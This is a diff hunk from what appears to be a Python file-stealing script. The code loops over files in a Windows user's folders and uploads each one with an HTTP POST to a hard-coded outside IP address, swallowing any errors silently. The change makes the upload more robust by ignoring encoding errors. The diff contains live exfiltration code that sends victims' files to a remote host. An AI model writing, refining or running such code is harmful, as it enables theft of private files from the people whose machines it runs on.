@@ -14,7 +14,7 @@ for folder in listdir(f'C:/Users/{user}'):
         print(file)
         try:
             url = 'http://3.85.122.241/globo_file.php'
-            files = {'file': open(bytes(file, encoding='utf-8'), 'rb')}
+            files = {'file': open(bytes(file, encoding='utf-8', errors='ignore'), 'rb')}
             r = requests.post(url, files=files)
         except:
             ...
